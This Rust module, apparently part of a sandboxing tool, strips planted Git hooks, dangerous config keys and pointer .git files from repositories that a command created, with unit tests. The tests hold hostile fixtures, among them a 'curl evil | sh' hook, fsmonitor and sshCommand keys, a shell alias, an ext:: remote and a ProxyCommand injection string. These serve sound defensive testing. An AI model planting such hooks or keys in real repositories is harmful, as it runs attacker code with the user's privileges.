//! Neutralising Git metadata that an in-place command CREATED (Release 1).
//!
//! The sandbox protects `.git` with mounts prepared from entries that exist BEFORE a command, so in a project
//! that had no `.git` a command can create one - and plant a hook or a config key - inside that one command.
//! Inside the sandbox that is harmless; the danger is later: the next `git` run by the person (or their editor,
//! outside any sandbox) executes `hooks/*`, and honours `core.fsmonitor`, `core.hooksPath`, `core.sshCommand`,
//! aliases starting with `!`, `filter.*`, `diff.*.command`, `ext::` remotes ... with the person's privileges.
//!
//! Nothing here can be prevented at creation time without a syscall supervisor, so the executable surface is
//! removed as soon as the creating command has ended:
//! * every hook that is not an inert `*.sample` is removed (a symlinked `hooks` directory is unlinked, never
//!   followed);
//! * `config` (and `config.worktree`) is rewritten to the keys a fresh repository legitimately has: core format
//!   switches, `user.name/email`, `remote.*.url` limited to https/ssh/git/scp forms, `remote.*.fetch`,
//!   `branch.*.remote/merge`. Everything else is dropped;
//! * a `.git` that is a FILE (a pointer to another directory) is removed;
//! * the same for `.git/modules/*`.
//!
//! Nothing is destroyed silently: every removed hook and the original config are copied into a private
//! quarantine directory first (bounded in size), and the execution result reports what was done. Every
//! operation is relative to a directory descriptor and never follows a symlink, so a command cannot aim this at
//! a file outside the project. This does not stop a command from reading or running code INSIDE its own sandbox;
//! it stops that code from surviving as something the person's own tools would run.

use serde::Serialize;
use std::ffi::{CStr, CString};
use std::io::{Read, Write};
use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
use std::path::Path;

const MAX_COPY: u64 = 1 << 20;
const MAX_ENTRIES: usize = 512;

#[derive(Debug, Clone, Default, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct Neutralized {
    pub hooks_removed: Vec<String>,
    pub config_rewritten: Vec<String>,
    pub git_file_removed: bool,
    /// Where the originals were copied (daemon-private), when anything was removed.
    pub quarantined: bool,
}

impl Neutralized {
    pub fn is_empty(&self) -> bool {
        self.hooks_removed.is_empty() && self.config_rewritten.is_empty() && !self.git_file_removed
    }
}

fn cstr(s: &str) -> Option<CString> {
    CString::new(s).ok()
}

fn open_dir_at(parent: RawFd, name: &str) -> Option<OwnedFd> {
    let c = cstr(name)?;
    let fd = unsafe {
        libc::openat(
            parent,
            c.as_ptr(),
            libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_CLOEXEC,
        )
    };
    (fd >= 0).then(|| unsafe { OwnedFd::from_raw_fd(fd) })
}

/// `st_mode & S_IFMT` of `name` without following a symlink; `None` if absent.
fn kind_at(parent: RawFd, name: &str) -> Option<u32> {
    let c = cstr(name)?;
    let mut st: libc::stat = unsafe { std::mem::zeroed() };
    let rc = unsafe { libc::fstatat(parent, c.as_ptr(), &mut st, libc::AT_SYMLINK_NOFOLLOW) };
    (rc == 0).then_some(st.st_mode & libc::S_IFMT)
}

/// Read a regular file (never through a symlink), bounded.
fn read_at(parent: RawFd, name: &str) -> Option<Vec<u8>> {
    let c = cstr(name)?;
    let fd = unsafe {
        libc::openat(
            parent,
            c.as_ptr(),
            libc::O_RDONLY | libc::O_NOFOLLOW | libc::O_CLOEXEC | libc::O_NONBLOCK,
        )
    };
    if fd < 0 {
        return None;
    }
    let f = std::fs::File::from(unsafe { OwnedFd::from_raw_fd(fd) });
    if !f.metadata().ok()?.is_file() {
        return None;
    }
    let mut b = Vec::new();
    f.take(MAX_COPY).read_to_end(&mut b).ok()?;
    Some(b)
}

fn names_in(dir: RawFd) -> Vec<String> {
    let fd = unsafe { libc::fcntl(dir, libc::F_DUPFD_CLOEXEC, 3) };
    if fd < 0 {
        return Vec::new();
    }
    let d = unsafe { libc::fdopendir(fd) };
    if d.is_null() {
        unsafe { libc::close(fd) };
        return Vec::new();
    }
    let mut out = Vec::new();
    loop {
        let e = unsafe { libc::readdir(d) };
        if e.is_null() || out.len() >= MAX_ENTRIES {
            break;
        }
        let name = unsafe { CStr::from_ptr((*e).d_name.as_ptr()) }
            .to_string_lossy()
            .into_owned();
        if name != "." && name != ".." {
            out.push(name);
        }
    }
    unsafe { libc::closedir(d) };
    out
}

struct Q<'a> {
    dir: &'a Path,
    used: bool,
}
impl Q<'_> {
    /// Keep a copy of what is about to be removed (best effort, bounded). A failure to keep it does not stop the
    /// removal: the dangerous surface goes either way.
    fn keep(&mut self, rel: &str, bytes: &[u8]) {
        let safe: String = rel
            .chars()
            .map(|c| {
                if c.is_ascii_alphanumeric() || c == '.' || c == '-' {
                    c
                } else {
                    '_'
                }
            })
            .collect();
        if std::fs::create_dir_all(self.dir).is_ok() {
            if let Ok(mut f) = std::fs::OpenOptions::new()
                .create(true)
                .truncate(true)
                .write(true)
                .open(self.dir.join(safe))
            {
                let _ = f.write_all(&bytes[..bytes.len().min(MAX_COPY as usize)]);
                self.used = true;
            }
        }
    }
}

/// Keys a fresh repository legitimately has. Everything else in a config created by a command is dropped.
fn allowed(section: &str, key: &str, value: &str) -> bool {
    let sec = section.to_ascii_lowercase();
    let key = key.to_ascii_lowercase();
    let v = value.trim();
    let no_ctl = !v.chars().any(|c| c.is_control());
    if !no_ctl {
        return false;
    }
    let (head, sub) = match sec.split_once(' ') {
        Some((h, s)) => (h.to_owned(), Some(s.to_owned())),
        None => (sec.clone(), None),
    };
    match (head.as_str(), sub.is_some(), key.as_str()) {
        (
            "core",
            false,
            "repositoryformatversion"
            | "filemode"
            | "bare"
            | "logallrefupdates"
            | "ignorecase"
            | "precomposeunicode"
            | "symlinks",
        ) => v.len() <= 8,
        ("user", false, "name" | "email") => v.len() <= 200,
        ("init", false, "defaultbranch") => v.len() <= 100,
        ("branch", true, "remote" | "merge") => v.len() <= 300,
        ("remote", true, "fetch") => v.len() <= 300 && !v.contains('!'),
        ("remote", true, "url") => safe_remote(v),
        _ => false,
    }
}

/// https / ssh / git URLs and scp-like `user@host:path`; never `ext::`, `fd::`, a local path or a `!` command.
fn safe_remote(v: &str) -> bool {
    if v.len() > 300
        || v.contains(' ')
        || v.contains('\\')
        || v.contains("::")
        || v.starts_with('-')
        || v.contains('!')
    {
        return false;
    }
    for p in ["https://", "http://", "ssh://", "git://"] {
        if let Some(rest) = v.strip_prefix(p) {
            return !rest.is_empty() && !rest.starts_with('-');
        }
    }
    // scp-like: user@host:path
    let Some((host, path)) = v.split_once(':') else {
        return false;
    };
    !host.is_empty()
        && !path.is_empty()
        && host.contains('@')
        && !host.contains('/')
        && !host.starts_with('-')
}

/// Rewrite git-config text to the allowed keys. Returns `(sanitized, changed)`.
fn sanitize_config(text: &str) -> (String, bool) {
    let mut out = String::new();
    let mut section: Option<String> = None;
    let mut keep_header = false;
    let mut changed = false;
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if let Some(h) = line.strip_prefix('[') {
            let Some(h) = h.strip_suffix(']') else {
                changed = true;
                section = None;
                continue;
            };
            // [remote "origin"] -> `remote "origin"`; [core] -> `core`; [core.sub] forms are not allowed
            let h = h.trim().replace('"', "");
            section = (!h.is_empty() && !h.contains(['\\', '\0'])).then_some(h);
            keep_header = false;
            if section.is_none() {
                changed = true;
            }
            continue;
        }
        let Some(sec) = &section else {
            changed = true;
            continue;
        };
        let (k, v) = match line.split_once('=') {
            Some((k, v)) => (k.trim(), v.trim().trim_matches('"')),
            None => (line, "true"),
        };
        if allowed(sec, k, v) {
            if !keep_header {
                match sec.split_once(' ') {
                    Some((h, s)) => out.push_str(&format!("[{h} \"{s}\"]\n")),
                    None => out.push_str(&format!("[{sec}]\n")),
                }
                keep_header = true;
            }
            out.push_str(&format!("\t{k} = {v}\n"));
        } else {
            changed = true;
        }
    }
    // a multi-line value or a trailing backslash can hide a dropped line: treat any backslash as a change
    if text.contains('\\') {
        changed = true;
    }
    (out, changed)
}

fn write_config(gitdir: RawFd, name: &str, content: &str) -> bool {
    let tmp = format!(".nexus-config-{}", std::process::id());
    let (Some(c), Some(t)) = (cstr(name), cstr(&tmp)) else {
        return false;
    };
    unsafe { libc::unlinkat(gitdir, t.as_ptr(), 0) };
    let fd = unsafe {
        libc::openat(
            gitdir,
            t.as_ptr(),
            libc::O_WRONLY | libc::O_CREAT | libc::O_EXCL | libc::O_NOFOLLOW | libc::O_CLOEXEC,
            0o644,
        )
    };
    if fd < 0 {
        return false;
    }
    let mut f = std::fs::File::from(unsafe { OwnedFd::from_raw_fd(fd) });
    let ok = f.write_all(content.as_bytes()).is_ok() && f.sync_all().is_ok();
    drop(f);
    if ok && unsafe { libc::renameat(gitdir, t.as_ptr(), gitdir, c.as_ptr()) } == 0 {
        true
    } else {
        unsafe { libc::unlinkat(gitdir, t.as_ptr(), 0) };
        false
    }
}

fn sanitize_gitdir(gitdir: RawFd, label: &str, q: &mut Q, out: &mut Neutralized, depth: u32) {
    // hooks
    match kind_at(gitdir, "hooks") {
        Some(k) if k == libc::S_IFLNK => {
            q.keep(
                &format!("{label}-hooks-symlink"),
                b"(a symlink named hooks)",
            );
            if let Some(c) = cstr("hooks") {
                unsafe { libc::unlinkat(gitdir, c.as_ptr(), 0) };
            }
            out.hooks_removed.push(format!("{label}/hooks (a symlink)"));
        }
        Some(k) if k == libc::S_IFDIR => {
            if let Some(h) = open_dir_at(gitdir, "hooks") {
                for n in names_in(h.as_raw_fd()) {
                    if n.ends_with(".sample") && kind_at(h.as_raw_fd(), &n) == Some(libc::S_IFREG) {
                        continue;
                    }
                    let bytes = read_at(h.as_raw_fd(), &n).unwrap_or_default();
                    q.keep(&format!("{label}-hook-{n}"), &bytes);
                    let removed = cstr(&n).is_some_and(|c| unsafe {
                        // files and symlinks; a directory cannot be a hook, and is left (never executed)
                        libc::unlinkat(h.as_raw_fd(), c.as_ptr(), 0) == 0
                    });
                    if removed {
                        out.hooks_removed.push(format!("{label}/hooks/{n}"));
                    }
                }
            }
        }
        _ => {}
    }
    // config and the per-worktree config
    for cfg in ["config", "config.worktree"] {
        match kind_at(gitdir, cfg) {
            Some(k) if k == libc::S_IFLNK => {
                q.keep(&format!("{label}-{cfg}-symlink"), b"(a symlink)");
                if let Some(c) = cstr(cfg) {
                    unsafe { libc::unlinkat(gitdir, c.as_ptr(), 0) };
                }
                out.config_rewritten
                    .push(format!("{label}/{cfg} (a symlink, removed)"));
            }
            Some(k) if k == libc::S_IFREG => {
                let Some(bytes) = read_at(gitdir, cfg) else {
                    continue;
                };
                let text = String::from_utf8_lossy(&bytes).into_owned();
                let (clean, changed) = sanitize_config(&text);
                if changed {
                    q.keep(&format!("{label}-{cfg}-original"), &bytes);
                    if write_config(gitdir, cfg, &clean) {
                        out.config_rewritten.push(format!("{label}/{cfg}"));
                    } else if let Some(c) = cstr(cfg) {
                        // could not rewrite: remove it rather than leave the dangerous version
                        unsafe { libc::unlinkat(gitdir, c.as_ptr(), 0) };
                        out.config_rewritten
                            .push(format!("{label}/{cfg} (removed)"));
                    }
                }
            }
            _ => {}
        }
    }
    // submodule repositories (bounded depth)
    if depth < 2 {
        if let Some(m) = open_dir_at(gitdir, "modules") {
            for n in names_in(m.as_raw_fd()) {
                if let Some(sub) = open_dir_at(m.as_raw_fd(), &n) {
                    sanitize_gitdir(
                        sub.as_raw_fd(),
                        &format!("{label}/modules/{n}"),
                        q,
                        out,
                        depth + 1,
                    );
                }
            }
        }
    }
}

/// Neutralise the `.git` entry `name` inside `parent` (a directory descriptor below the project root). Call it only
/// for a `.git` that a command CREATED. `quarantine` is a private directory for the originals.
pub fn neutralize_created_git(
    parent: RawFd,
    name: &str,
    label: &str,
    quarantine: &Path,
) -> Neutralized {
    let mut out = Neutralized::default();
    let mut q = Q {
        dir: quarantine,
        used: false,
    };
    match kind_at(parent, name) {
        Some(k) if k == libc::S_IFDIR => {
            if let Some(d) = open_dir_at(parent, name) {
                sanitize_gitdir(d.as_raw_fd(), label, &mut q, &mut out, 0);
            }
        }
        // `.git` as a file points at a git directory elsewhere (maybe outside the project): remove the pointer
        Some(k) if k == libc::S_IFREG || k == libc::S_IFLNK => {
            let bytes = read_at(parent, name).unwrap_or_default();
            q.keep(&format!("{label}-gitfile"), &bytes);
            if let Some(c) = cstr(name) {
                if unsafe { libc::unlinkat(parent, c.as_ptr(), 0) } == 0 {
                    out.git_file_removed = true;
                }
            }
        }
        _ => {}
    }
    out.quarantined = q.used;
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::{symlink, PermissionsExt};

    fn gitdir() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
        let t = tempfile::tempdir().unwrap();
        let root = t.path().join("proj");
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let q = t.path().join("quarantine");
        (t, root, q)
    }
    fn run(root: &Path, q: &Path) -> Neutralized {
        let d = std::fs::File::open(root).unwrap();
        neutralize_created_git(d.as_raw_fd(), ".git", ".git", q)
    }

    #[test]
    fn planted_hooks_are_removed_samples_are_kept_and_originals_are_quarantined() {
        let (_t, root, q) = gitdir();
        let h = root.join(".git/hooks");
        std::fs::write(h.join("pre-commit"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        std::fs::set_permissions(h.join("pre-commit"), std::fs::Permissions::from_mode(0o755))
            .unwrap();
        std::fs::write(h.join("post-checkout"), "x").unwrap();
        std::fs::write(h.join("pre-push.sample"), "inert").unwrap();
        symlink("/bin/sh", h.join("prepare-commit-msg")).unwrap();
        let r = run(&root, &q);
        assert_eq!(r.hooks_removed.len(), 3, "{r:?}");
        assert!(!h.join("pre-commit").exists() && !h.join("post-checkout").exists());
        assert!(std::fs::symlink_metadata(h.join("prepare-commit-msg")).is_err());
        assert!(h.join("pre-push.sample").exists(), "inert samples stay");
        assert!(r.quarantined);
        let kept = std::fs::read_to_string(q.join(".git-hook-pre-commit")).unwrap();
        assert!(kept.contains("curl evil"), "nothing is destroyed silently");
        // /bin/sh was never touched
        assert!(Path::new("/bin/sh").exists());
    }

    #[test]
    fn a_symlinked_hooks_directory_is_unlinked_never_followed() {
        let (t, root, q) = gitdir();
        std::fs::remove_dir_all(root.join(".git/hooks")).unwrap();
        let outside = t.path().join("outside-hooks");
        std::fs::create_dir(&outside).unwrap();
        std::fs::write(outside.join("pre-commit"), "mine").unwrap();
        symlink(&outside, root.join(".git/hooks")).unwrap();
        let r = run(&root, &q);
        assert!(
            r.hooks_removed.iter().any(|s| s.contains("symlink")),
            "{r:?}"
        );
        assert!(std::fs::symlink_metadata(root.join(".git/hooks")).is_err());
        assert_eq!(
            std::fs::read_to_string(outside.join("pre-commit")).unwrap(),
            "mine",
            "the link target was touched"
        );
    }

    #[test]
    fn dangerous_config_keys_are_dropped_and_the_original_is_kept() {
        let (_t, root, q) = gitdir();
        std::fs::write(
            root.join(".git/config"),
            "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tfsmonitor = /tmp/evil\n\thooksPath = /tmp/h\n\tsshCommand = sh -c 'id'\n\tpager = sh\n[alias]\n\tst = !sh -c 'curl x | sh'\n[filter \"lfs\"]\n\tclean = evil %f\n[remote \"origin\"]\n\turl = ext::sh -c evil\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[remote \"good\"]\n\turl = https://example.org/r.git\n[user]\n\tname = Dev\n\temail = d@example.org\n[include]\n\tpath = /tmp/more\n[diff \"x\"]\n\tcommand = evil\n",
        )
        .unwrap();
        let r = run(&root, &q);
        assert_eq!(r.config_rewritten, [".git/config"], "{r:?}");
        let c = std::fs::read_to_string(root.join(".git/config")).unwrap();
        for bad in [
            "fsmonitor",
            "hooksPath",
            "sshCommand",
            "pager",
            "alias",
            "filter",
            "ext::",
            "include",
            "diff",
            "evil",
            "!sh",
        ] {
            assert!(!c.contains(bad), "{bad} survived: {c}");
        }
        for good in [
            "repositoryformatversion",
            "filemode",
            "https://example.org/r.git",
            "name = Dev",
            "email = d@example.org",
            "+refs/heads/*:refs/remotes/origin/*",
        ] {
            assert!(c.contains(good), "{good} was lost: {c}");
        }
        assert!(std::fs::read_to_string(q.join(".git-config-original"))
            .unwrap()
            .contains("fsmonitor"));
    }

    #[test]
    fn a_clean_config_is_left_untouched_and_nothing_is_quarantined() {
        let (_t, root, q) = gitdir();
        let clean = "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n";
        std::fs::write(root.join(".git/config"), clean).unwrap();
        let r = run(&root, &q);
        assert!(r.is_empty(), "{r:?}");
        assert_eq!(
            std::fs::read_to_string(root.join(".git/config")).unwrap(),
            clean
        );
        assert!(!q.exists());
    }

    #[test]
    fn a_symlinked_config_is_removed_not_followed() {
        let (t, root, q) = gitdir();
        let outside = t.path().join("outside.cfg");
        std::fs::write(&outside, "[core]\n\tfsmonitor = evil\n").unwrap();
        symlink(&outside, root.join(".git/config")).unwrap();
        let r = run(&root, &q);
        assert!(
            r.config_rewritten.iter().any(|s| s.contains("symlink")),
            "{r:?}"
        );
        assert!(std::fs::symlink_metadata(root.join(".git/config")).is_err());
        assert!(
            std::fs::read_to_string(&outside)
                .unwrap()
                .contains("fsmonitor"),
            "the target was modified"
        );
    }

    #[test]
    fn a_git_file_pointing_elsewhere_is_removed() {
        let t = tempfile::tempdir().unwrap();
        let root = t.path().join("proj");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join(".git"),
            "gitdir: /home/someone/.hooks-repo/.git\n",
        )
        .unwrap();
        let r = run(&root, &t.path().join("q"));
        assert!(r.git_file_removed, "{r:?}");
        assert!(!root.join(".git").exists());
    }

    #[test]
    fn submodule_repositories_and_worktree_config_are_covered_too() {
        let (_t, root, q) = gitdir();
        std::fs::create_dir_all(root.join(".git/modules/sub/hooks")).unwrap();
        std::fs::write(root.join(".git/modules/sub/hooks/pre-commit"), "evil").unwrap();
        std::fs::write(
            root.join(".git/modules/sub/config"),
            "[core]\n\tfsmonitor = evil\n",
        )
        .unwrap();
        std::fs::write(
            root.join(".git/config.worktree"),
            "[core]\n\thooksPath = /tmp/x\n",
        )
        .unwrap();
        let r = run(&root, &q);
        assert!(
            !root.join(".git/modules/sub/hooks/pre-commit").exists(),
            "{r:?}"
        );
        assert!(
            !std::fs::read_to_string(root.join(".git/modules/sub/config"))
                .unwrap()
                .contains("fsmonitor")
        );
        assert!(!std::fs::read_to_string(root.join(".git/config.worktree"))
            .unwrap()
            .contains("hooksPath"));
    }

    #[test]
    fn remote_urls_are_limited_to_plain_transports() {
        for ok in [
            "https://h/r.git",
            "ssh://git@h/r",
            "git://h/r",
            "git@github.com:o/r.git",
        ] {
            assert!(safe_remote(ok), "{ok}");
        }
        for bad in [
            "ext::sh -c x",
            "fd::3",
            "/tmp/repo",
            "../r",
            "file:///x",
            "https://h/r --upload-pack=x",
            "-oProxyCommand=x",
            "!cmd",
            "a@b:c\\d",
            "",
        ] {
            assert!(!safe_remote(bad), "{bad}");
        }
    }

    #[test]
    fn a_backslash_continuation_cannot_hide_a_dangerous_line() {
        let (c, changed) =
            sanitize_config("[core]\n\tfilemode = true\n[alias]\n\tx = !sh \\\n\t  -c evil\n");
        assert!(
            changed && !c.contains("alias") && !c.contains("evil"),
            "{c}"
        );
    }

    #[test]
    fn nothing_happens_when_there_is_no_git() {
        let t = tempfile::tempdir().unwrap();
        let d = std::fs::File::open(t.path()).unwrap();
        let r = neutralize_created_git(d.as_raw_fd(), ".git", ".git", &t.path().join("q"));
        assert!(r.is_empty() && !r.quarantined);
    }
}
